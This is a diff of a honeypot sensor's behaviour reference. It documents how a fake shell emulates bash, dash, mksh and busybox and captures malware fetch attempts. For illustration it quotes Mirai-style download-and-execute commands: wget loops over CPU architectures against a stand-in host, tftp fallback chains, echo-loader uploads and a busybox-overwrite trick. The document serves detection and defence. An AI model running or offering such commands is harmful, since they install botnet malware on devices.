@@ -4,7 +4,7 @@ audience: all
 status: current
 owner: maintainer
 applies-to: 0.4.0 (untagged; latest tag v0.1.0)
-last-verified: 2026-10-07
+last-verified: 2026-10-08
 -->
 
 # Sensor behavior reference
@@ -275,8 +275,8 @@ I/O (`crates/sensor-framework/src/shell/mod.rs`). This is asserted by `never_exe
   connection's one `download_cap` marker is emitted and no further `honeypot_file_download` events;
   a refused re-entry, loop or nesting is a silent failure with status 1, never an error string. A connection that has written its 16 MiB is dropped after
   the reply that spent it.
-- A recognized fetch verb additionally emits `honeypot_file_download` with
-  `metadata.url`, capped at `MAX_URL_LEN = 512` (`crates/sensor-framework/src/shell/mod.rs#MAX_URL_LEN`, `crates/sensor-framework/src/shell/mod.rs#FakeShell::handle_input`).
+- A fetch verb the line executes additionally emits `honeypot_file_download` with
+  `metadata.url`, capped at `MAX_URL_LEN = 512` (`crates/sensor-framework/src/shell/mod.rs#MAX_URL_LEN`, `crates/sensor-framework/src/shell/fetch.rs#FakeShell::append_downloads`).
 - **Standard input.** The sensors run each line through `start_line`
   (`crates/sensor-framework/src/shell/mod.rs#FakeShell::start_line`), which decides by the
   shell's own model of the commands whether the line reads the session's input: it runs the line
@@ -327,7 +327,9 @@ I/O (`crates/sensor-framework/src/shell/mod.rs`). This is asserted by `never_exe
   (`( )`, a pipeline stage, `$( )` and `&` get a copy of the working directory and variables;
   `{ }` does not). A trailing `&` runs the command at once and, in an interactive login shell,
   prints `[N] PID`. An unfinished construct waits for more input under the PS2 prompt `> ` (64
-  lines or 64 KiB at most). Constructs outside this subset (`case`, `[[ ]]`, functions, `$'..'`,
+  lines or 64 KiB at most). `case WORD in pat|pat) list ;; ... esac` runs the first arm whose
+  pattern matches (unquoted `*`, `?` and `[..]` glob, a quoted one is literal, a `/` matches);
+  no match is status 0. Constructs outside this subset (`[[ ]]`, functions, `$'..'`,
   `${x##*/}`, brace expansion, `<<<`, arrays) parse and are skipped with status 0 and no output;
   what bash and dash also reject prints their syntax error and status 2. `read`, `export`,
   `unset`, `set`, `shift`, `umask`, `break`, `continue`, `cd`, `exit` act on the shell itself
@@ -399,7 +401,9 @@ I/O (`crates/sensor-framework/src/shell/mod.rs`). This is asserted by `never_exe
   with the raw `command` and no `url`, so the fetcher is never handed a guessed target; a `tftp`
   upload (`-p`, `put`) emits no download event and saves no file,
   `crates/sensor-framework/src/shell/tftp.rs#parse`),
-  `chmod`/`cp`/`rm`/`mkdir` (silent success), `sleep` (returns at once; GNU's errors for a
+  `chmod` (silent success; on the Ubuntu persona a missing operand is named as GNU chmod does,
+  `chmod: cannot access 'x': No such file or directory`, status 1),
+  `cp`/`rm`/`mkdir` (silent success), `sleep` (returns at once; GNU's errors for a
   missing or bad interval), `cd`, `exit`/`logout`; an
   unknown command uses the active shell level's diagnostic form, and so does a path that does
   not exist: bash's `No such file or directory`, dash's and mksh's `not found`
@@ -413,13 +417,32 @@ I/O (`crates/sensor-framework/src/shell/mod.rs`). This is asserted by `never_exe
   URL), so none is invented. A name the banner does not list, `curl`
   included (real busybox ships none), gives `applet not found` - matching the real-busybox check
   Mirai/Gafgyt perform.
-- Download capture handles direct, busybox, full-path, and
-  `sh -c "wget ...; ..."` chained forms. A line is split into its simple commands
-  at `;`, `|`, `||`, `&&`, `&`, parentheses, backticks and newlines, each command
-  cut at its first redirection, and every fetcher in the line is examined; one
-  `honeypot_file_download` is emitted per distinct url, so a Mirai
-  `(tftp ... || busybox tftp ...) > t` fallback chain yields one event
-  (`download_targets`, `simple_commands`).
+- Download events come from what a line executes
+  (`crates/sensor-framework/src/shell/fetch.rs`). When the evaluator runs a simple command whose
+  expanded argument vector is a fetch (`wget`, `curl`, `tftp`, `ftpget`, direct, full-path or
+  `busybox` forms, a bare `tftp` the persona has no file for included), the event is built from
+  those arguments, so a fetch in a loop, a script run by `sh FILE` or `sh -c`, a command
+  substitution, or after a variable assignment or a `case` that chose the binary's name reports the
+  URL it named (`for a in mips arm; do wget http://h/$a; done` gives two events). Text that merely
+  holds a fetch (an `echo` or `printf` argument, a here-document body, a quoted assignment) reports
+  nothing; the script a bot writes with `echo ... >> f` is captured as before and reports its
+  fetches on the line that runs it. A URL left holding `$name`, `${..}`, `$(..)` or a backtick, or
+  built from a variable that is not set, is not a url: the event carries the command as written and
+  no `url`. One event per distinct fetch per input line, the whole line (every script it runs)
+  sharing the 8-per-line cap and the connection's 64, so a Mirai `(tftp ... || busybox tftp ...) >
+  t` fallback chain yields one event.
+  A lexical pass over the line's text is kept as a fallback for evidence the evaluator did not
+  reach: a branch the fake's answers skipped (`test -f x && wget URL`), functions and the other
+  constructs outside the grammar subset (functions never run, so a fetch in one is found only
+  here), a syntax error, an exhausted budget. It reads the text with the shell's own tokenizer
+  (quotes and here-documents honoured), looks only at command position (after `if`/`then`/`do`,
+  assignments and `nohup`/`env`/`sudo`/`toybox`-style wrappers) and inside `sh -c 'script'`, and
+  adds nothing for a URL the line also executed; a fallback command holding `$name` is reported
+  only when the line executed no fetch. Text the tokenizer cannot read (an unterminated quote) is
+  scanned by the older whole-line heuristic. A line that only opens a construct (`for ...; do`
+  waiting for `done`, a here-document) reports nothing until the construct completes, and one never
+  completed reports nothing
+  (`crates/sensor-framework/src/shell/fetch.rs#FakeShell::append_downloads`).
 - Echo-loader reassembly (`crates/sensor-framework/src/shell/loader.rs`). A Mirai or Mozi loader
   with no usable `wget` uploads a small downloader as `busybox echo -ne '\xNN...' > .i`, then
   `>> .i` per chunk, makes it executable (`chmod 777 .i`, or `cp /bin/ls .j && cat .i>.j && rm .i
@@ -437,7 +460,29 @@ I/O (`crates/sensor-framework/src/shell/mod.rs`). This is asserted by `never_exe
   arguments are four octets and a port, the shell answers as that downloader does when its server
   cannot be reached: no output and status 1 [inferred: the exact status of the observed sample],
   since this box connects nowhere and so never gets the stage 2 the loader looks for next; any
-  other session-made file runs as an empty program (status 0). The stage-2 URL it would have
+  other session-made file runs as an empty program (status 0), unless it is built for another CPU
+  (next bullet).
+- Executing a program built for another CPU fails
+  (`crates/sensor-framework/src/shell/arch.rs`). Per-architecture loops
+  (`for a in mips mpsl arm4 ... x86_64 x86; do wget .../$a -O .c; chmod +x .c && ./.c && break;
+  done`) and the Eclipse busybox-copy trick (`cp /bin/busybox eclipsebox; cat eclipse.mips >
+  eclipsebox; ./eclipsebox`) rely on a foreign build failing so the next one is tried. A file is
+  judged by its bytes when they are an ELF (class, byte order and `e_machine` against the persona:
+  x86_64 on Ubuntu, which also runs 32-bit x86 as the distribution's kernel does, and 32-bit ARM
+  of any generation on the Android persona's `armv7l`). The fake fetch applets write a canned HTML
+  body, not a binary, so a fetched file is judged by the architecture token in its URL's file name,
+  else in its local name (`mips`, `mipsel`/`mpsl`, `arm`/`arm4`..`arm7`/`armv7l`, `aarch64`/`arm64`,
+  `ppc`, `sh4`, `m68k`, `spc`/`sparc`, `i586`/`i686`/`x86`, `x86_64`/`amd64`; a whole name part, so
+  `alarm` or `mips.sh` name nothing). That origin follows `cp`, `mv` and `cat FILE > DEST`, and any
+  other write to the file drops it. A file with neither (a script the session typed, a fetch with
+  no token in it) runs silently as before. The refusal is bash 5.1's `bash: ./x: cannot execute
+  binary file: Exec format error` (status 126; `-bash:` at the login prompt, `bash: line 1:` for an
+  exec request), dash's `sh: 1: ./x: Exec format error` (status 126), both reproduced on Ubuntu
+  22.04, and on the Android persona mksh's `sh: ./x: not executable: 32-bit ELF file` (`64-bit`
+  for a 64-bit build), read from the AOSP marshmallow-release `external/mksh/src/exec.c`
+  (`scriptexec`). TODO: mksh's status is 1 by that source's `errorf` and the phone's exact prefix
+  has no device capture [unverified]. The script-file form of dash's prefix (`.s: 3:` rather than
+  `sh: 3:`) is a known gap shared with every dash script error. The stage-2 URL it would have
   requested is emitted as a `honeypot_file_download` marked `derived_from: echo_loader_args`, for
   the vetted fetcher only ([attack-surfaces.md](../security/attack-surfaces.md#malware-fetcher-attacker-directed-outbound)).
 - Base64 APK loaders on the Android shell (`crates/sensor-framework/src/shell/loader.rs`,
